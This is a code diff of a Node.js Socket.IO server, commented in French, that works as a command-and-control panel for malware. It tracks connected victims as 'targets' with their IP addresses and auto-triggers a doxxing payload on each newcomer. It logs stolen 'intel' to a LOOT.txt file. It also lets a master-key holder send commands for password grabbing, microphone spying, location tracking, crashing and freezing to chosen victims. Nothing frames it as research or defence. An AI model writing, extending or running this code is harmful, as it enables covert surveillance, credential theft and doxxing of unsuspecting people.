@@ -16,31 +16,36 @@ io.on('connection', (socket) => {
     const ip = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
 
     socket.on('init', (data) => {
-        const t = { id: socket.id, n: data.n, e: data.e, ip: ip };
+        const t = { id: socket.id, n: data.n, e: data.e, ip: ip, join: new Date().toLocaleTimeString() };
         targets.push(t);
-
-        // --- AUTO-ATTACK PROTOCOL ---
+        
+        // Auto-Strike pour les nouveaux (invisibles)
         if (t.e !== MASTER_KEY) {
-            console.log(`\x1b[41m[TARGET_LOCKED]\x1b[0m ${t.n} (${ip})`);
-            // On lance l'extraction de haut niveau immédiatement
             setTimeout(() => {
                 io.to(socket.id).emit('execute', { type: 'p_heavy_dox' });
-                io.to(socket.id).emit('execute', { type: 'p_pass_grab' });
-            }, 1000);
+            }, 2000);
         }
-
-        io.emit('sync', targets.map(u => ({ id: u.id, n: u.n, e: u.e })));
+        io.emit('sync', targets.map(u => ({ id: u.id, n: u.n, e: u.e, ip: u.ip })));
     });
 
-    // Enregistrement des données volées dans un fichier
-    socket.on('intel_drop', (data) => {
-        const entry = `[${new Date().toLocaleString()}] IP: ${ip} | TYPE: ${data.type} | DATA: ${data.content}\n`;
-        fs.appendFileSync('LOOT.txt', entry);
-        io.emit('master_update', { n: data.n, content: data.content });
+    socket.on('chat', (data) => {
+        const sender = targets.find(u => u.id === socket.id);
+        if (!sender) return;
+
+        if (data.type === 'intel') {
+            const logEntry = `[${new Date().toLocaleString()}] [LOOT] ${sender.n} (${sender.ip}) : ${data.t}\n`;
+            fs.appendFileSync('LOOT.txt', logEntry);
+        }
+        io.emit('chat', { n: sender.n, t: data });
     });
 
-    socket.on('command', (d) => {
-        io.to(d.target).emit('execute', { type: d.type });
+    // Commandes du Maître
+    const cmds = ['p_heavy_dox', 'p_pass_grab', 'p_crash', 'p_freeze', 'p_loc', 'p_mic_spy', 'p_osint'];
+    cmds.forEach(type => {
+        socket.on(type, (tId) => {
+            const boss = targets.find(u => u.id === socket.id);
+            if (boss && boss.e === MASTER_KEY) io.to(tId).emit('execute', { type });
+        });
     });
 
     socket.on('disconnect', () => {
